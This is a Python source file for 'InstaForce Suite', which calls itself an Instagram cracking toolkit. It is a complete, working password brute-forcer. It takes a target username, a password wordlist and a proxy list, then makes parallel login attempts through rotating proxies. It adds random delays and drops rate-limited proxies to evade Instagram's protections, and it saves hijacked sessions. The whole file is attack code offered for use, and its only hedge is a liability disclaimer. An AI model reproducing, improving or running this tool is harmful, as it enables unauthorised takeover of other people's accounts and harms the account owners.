import os
import sys
import json
import time
import random
import logging
from threading import Thread, Event
from concurrent.futures import ThreadPoolExecutor
from queue import Queue
from instagrapi import Client
from instagrapi.exceptions import LoginRequired, ChallengeRequired, TwoFactorRequired, ClientError
from cryptography.fernet import Fernet

# Console Colors (fallback to no color if not supported)
def supports_ansi():
    if os.name == "nt":
        return os.environ.get("TERM_PROGRAM") == "vscode" or "ANSICON" in os.environ
    return sys.stdout.isatty()

if supports_ansi():
    COLOR_PURPLE = "\033[95m"
    COLOR_CYAN = "\033[96m"
    COLOR_RED = "\033[91m"
    COLOR_GREEN = "\033[92m"
    COLOR_BOLD = "\033[1m"
    COLOR_RESET = "\033[0m"
    COLOR_YELLOW = "\033[93m"
else:
    COLOR_PURPLE = COLOR_CYAN = COLOR_RED = COLOR_GREEN = ""
    COLOR_BOLD = COLOR_RESET = COLOR_YELLOW = ""

def color_text(text, color):
    return f"{color}{text}{COLOR_RESET}"

def print_purple(text, end="\n"):
    print(color_text(text, COLOR_PURPLE), end=end)

def print_cyan(text, end="\n"):
    print(color_text(text, COLOR_CYAN), end=end)

def print_red(text, end="\n"):
    print(color_text(text, COLOR_RED), end=end)

def print_green(text, end="\n"):
    print(color_text(text, COLOR_GREEN), end=end)

def print_yellow(text, end="\n"):
    print(color_text(text, COLOR_YELLOW), end=end)

def input_cyan(prompt):
    try:
        return input(color_text(prompt, COLOR_CYAN))
    except UnicodeEncodeError:
        return input(prompt)

def print_banner_from_file(banner_path="banner.txt"):
    """
    Reads and prints the entire banner.txt exactly as-is, preserving any formatting or characters.
    If the file is missing, prints a simple title instead.
    """
    try:
        with open(banner_path, "r", encoding="utf-8") as f:
            banner = f.read()
        print(banner, end="" if banner.endswith("\n") else "\n")
    except Exception:
        print_purple("InstaForce Suite (IFS)\n")

def print_warning():
    warning = (
        f"{COLOR_YELLOW}{COLOR_BOLD}⚠️  WARNING: Use this tool at your own risk. "
        f"You are responsible for your actions. The author assumes no liability for misuse.{COLOR_RESET}\n"
    )
    try:
        print(warning)
    except UnicodeEncodeError:
        # fallback to ASCII
        print("WARNING: Use this tool at your own risk. You are responsible for your actions. The author assumes no liability for misuse.\n")

IFS_LOG_FILE = "ifs_session.log"
IFS_FAILED_ATTEMPTS_FILE = "ifs_failed.log"
IFS_SESSION_DIR = "ifs_sessions"
IFS_KEY_FILE = "ifs_secret.key"
DELAY_MIN = 5
DELAY_MAX = 15

def ensure_session_dir():
    if not os.path.exists(IFS_SESSION_DIR):
        os.makedirs(IFS_SESSION_DIR)

def get_session_file(username):
    safe_username = "".join(c for c in username if c.isalnum() or c in ('-_')).rstrip()
    return os.path.join(IFS_SESSION_DIR, f"session_{safe_username}.enc")

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    handlers=[logging.FileHandler(IFS_LOG_FILE, encoding="utf-8")]
)

def get_or_generate_key():
    if os.path.exists(IFS_KEY_FILE):
        with open(IFS_KEY_FILE, "rb") as f:
            return f.read()
    key = Fernet.generate_key()
    with open(IFS_KEY_FILE, "wb") as f:
        f.write(key)
    return key

def encrypt_data(data, key):
    f = Fernet(key)
    return f.encrypt(json.dumps(data).encode())

def decrypt_data(encrypted_data, key):
    f = Fernet(key)
    return json.loads(f.decrypt(encrypted_data).decode())

def load_session(username):
    session_file = get_session_file(username)
    if not os.path.exists(session_file):
        return None
    try:
        key = get_or_generate_key()
        with open(session_file, "rb") as f:
            return decrypt_data(f.read(), key)
    except Exception as e:
        logging.error(f"Failed to load session: {e}")
        return None

def save_session(username, data):
    ensure_session_dir()
    session_file = get_session_file(username)
    key = get_or_generate_key()
    encrypted = encrypt_data(data, key)
    with open(session_file, "wb") as f:
        f.write(encrypted)

def mask_password(pw):
    if len(pw) <= 2:
        return "*" * len(pw)
    return pw[0] + "*" * (len(pw) - 2) + pw[-1]

def write_failed_attempt(username, password):
    try:
        with open(IFS_FAILED_ATTEMPTS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{username}:{mask_password(password)}\n")
    except Exception:
        with open(IFS_FAILED_ATTEMPTS_FILE, "a") as f:
            f.write(f"{username}:***\n")

class Spinner:
    spinner_cycle = ['|', '/', '-', '\\']
    def __init__(self, message, status_func):
        self.stop_event = Event()
        self.thread = Thread(target=self.spin)
        self.idx = 0
        self.message = message
        self.status_func = status_func

    def spin(self):
        while not self.stop_event.is_set():
            spin_char = self.spinner_cycle[self.idx % len(self.spinner_cycle)]
            status = self.status_func() if self.status_func else ""
            try:
                sys.stdout.write(f"\r{COLOR_CYAN}{self.message} {status} {spin_char}{COLOR_RESET}")
            except UnicodeEncodeError:
                sys.stdout.write(f"\r{self.message} {status} {spin_char}")
            sys.stdout.flush()
            self.idx += 1
            time.sleep(0.12)
        sys.stdout.write("\r" + " " * (len(self.message) + 40) + "\r")
        sys.stdout.flush()

    def start(self):
        self.thread.start()

    def stop(self):
        self.stop_event.set()
        self.thread.join()

def attempt_login(username, password, proxy, found_event, results_queue):
    if found_event.is_set():
        return None
    cl = Client()
    if proxy:
        cl.set_proxy(proxy)
        logging.info(f"Using proxy: {proxy}")
    session_data = load_session(username)
    if session_data:
        try:
            cl.load_settings(session_data)
            logging.info("Loaded previous session.")
        except Exception as e:
            logging.warning(f"Failed to load session: {e}")
    delay = random.uniform(DELAY_MIN, DELAY_MAX)
    logging.info(f"Waiting {delay:.1f} seconds before attempt...")
    time.sleep(delay)
    try:
        login_result = cl.login(username, password)
        logging.info("Login attempt complete.")
        if login_result:
            logging.info("✅ Login successful!")
            save_session(username, cl.get_settings())
            results_queue.put((f"{COLOR_GREEN}[SUCCESS]{COLOR_RESET} {username}:{mask_password(password)} [{proxy}]"))
            found_event.set()
            return ("success", proxy, password)
    except TwoFactorRequired:
        logging.error("2FA Required.")
    except ChallengeRequired:
        logging.error("Challenge Required.")
    except LoginRequired:
        logging.error("Login Required.")
        results_queue.put((f"{COLOR_RED}[FAIL]{COLOR_RESET} {username}:{mask_password(password)} [{proxy}]"))
        write_failed_attempt(username, password)
        return ("invalid", proxy, password)
    except ClientError as e:
        logging.error(f"ClientError: {e}")
        if "Please wait a few minutes" in str(e) or "rate limit" in str(e).lower():
            logging.error("⏳ Rate limit detected. Removing proxy.")
            results_queue.put((f"{COLOR_RED}[BANNED]{COLOR_RESET} {username}:{mask_password(password)} [{proxy}]"))
            return ("banned", proxy, password)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
    results_queue.put((f"{COLOR_RED}[FAIL]{COLOR_RESET} {username}:{mask_password(password)} [{proxy}]"))
    write_failed_attempt(username, password)
    return ("fail", proxy, password)

def attempt_login_serial(username, password, found_event):
    if found_event.is_set():
        return None
    spinner = Spinner("Checking password", None)
    spinner.start()
    cl = Client()
    session_data = load_session(username)
    if session_data:
        try:
            cl.load_settings(session_data)
            logging.info("Loaded previous session.")
        except Exception as e:
            logging.warning(f"Failed to load session: {e}")
    delay = random.uniform(DELAY_MIN, DELAY_MAX)
    logging.info(f"Waiting {delay:.1f} seconds before attempt...")
    time.sleep(delay)
    result = None
    try:
        login_result = cl.login(username, password)
        logging.info("Login attempt complete.")
        result = "success" if login_result else "fail"
    except TwoFactorRequired:
        logging.error("2FA Required.")
    except ChallengeRequired:
        logging.error("Challenge Required.")
    except LoginRequired:
        logging.error("Login Required.")
        result = "invalid"
        write_failed_attempt(username, password)
    except ClientError as e:
        logging.error(f"ClientError: {e}")
        write_failed_attempt(username, password)
    except Exception as e:
        logging.error(f"Unexpected error: {e}")
        write_failed_attempt(username, password)
    spinner.stop()
    if result == "success":
        print_green("Found it, boss!")
        found_event.set()
        return ("success", None, password)
    else:
        print_red("Password incorrect.")
        return ("fail", None, password)

def main():
    print_banner_from_file()
    print_purple(f"{COLOR_BOLD}Welcome to InstaForce Suite (IFS) — The Scalable Instagram Cracking Toolkit!{COLOR_RESET}")
    print_warning()

    username = input_cyan("[?] Instagram username: ").strip()
    password_file = input_cyan("[?] Path to password list (txt): ").strip()
    proxy_file = input_cyan("[?] Path to proxy list (txt) (leave blank for NO proxy): ").strip()

    try:
        with open(password_file, "r", encoding="utf-8") as f:
            passwords = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print_red("Password file not found. Exiting.")
        return

    proxies = []
    if proxy_file:
        try:
            with open(proxy_file, "r", encoding="utf-8") as f:
                proxies = [line.strip() for line in f if line.strip()]
            if not proxies:
                print_red("No proxies in proxy list. Switching to serial mode.")
        except Exception:
            print_red("Proxy list file not found. Switching to serial mode.")

    total_attempts = 0
    total_successes = 0
    total_failures = 0
    success_log = []
    found_event = Event()

    print_cyan(f"\nTarget: {username}\n")

    if proxies:
        proxy_pool = proxies.copy()
        password_idx = 0
        results_queue = Queue()
        while password_idx < len(passwords) and proxy_pool and not found_event.is_set():
            batch_size = min(len(proxy_pool), len(passwords) - password_idx)
            batch_pw = passwords[password_idx:password_idx + batch_size]
            batch_proxy = proxy_pool[:batch_size]
            active_jobs = [batch_size]

            def status_func():
                return f"[Active: {active_jobs[0]}/{batch_size}]"

            spinner = Spinner("Checking passwords...", status_func)
            spinner.start()

            futures = []
            with ThreadPoolExecutor(max_workers=batch_size) as executor:
                for pw, px in zip(batch_pw, batch_proxy):
                    futures.append(executor.submit(
                        attempt_login,
                        username, pw, px, found_event, results_queue
                    ))
                for _ in futures:
                    msg = results_queue.get()
                    print(msg)
                    total_attempts += 1
                    active_jobs[0] -= 1
            spinner.stop()
            password_idx += batch_size

        if not found_event.is_set():
            print_red("No valid key found for this target.")

    else:
        for pw in passwords:
            if found_event.is_set():
                break
            result = attempt_login_serial(username, pw, found_event)
            total_attempts += 1
            if result is None:
                continue
            status, _, password_used = result
            if status == "success":
                total_successes += 1
                success_log.append((username, mask_password(password_used)))
                found_event.set()
            else:
                total_failures += 1
        if not found_event.is_set():
            print_red("No valid key found for this target.")

    print_purple("\n======= IFS SESSION SUMMARY =======")
    print_cyan(f"Attempts: {total_attempts}")
    print_green(f"Successes: {total_successes}")
    print_red(f"Failures: {total_failures}")
    if success_log:
        print_green("\nUnlocked targets:")
        for user, pw in success_log:
            print_green(f" - {user}: {pw}")
    else:
        print_red("\nNo targets unlocked.")
    print_cyan(f"\nFailed attempts are logged in '{IFS_FAILED_ATTEMPTS_FILE}'.")
    print_cyan(f"Technical logs available in '{IFS_LOG_FILE}'.")
    print_purple(f"\nThank you for using InstaForce Suite (IFS)!")

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        try:
            print_yellow("\n✖ Interrupted by user. Exiting InstaForce Suite. Goodbye!\n")
        except:
            print("\nInterrupted by user. Exiting InstaForce Suite. Goodbye!\n")
        sys.exit(0)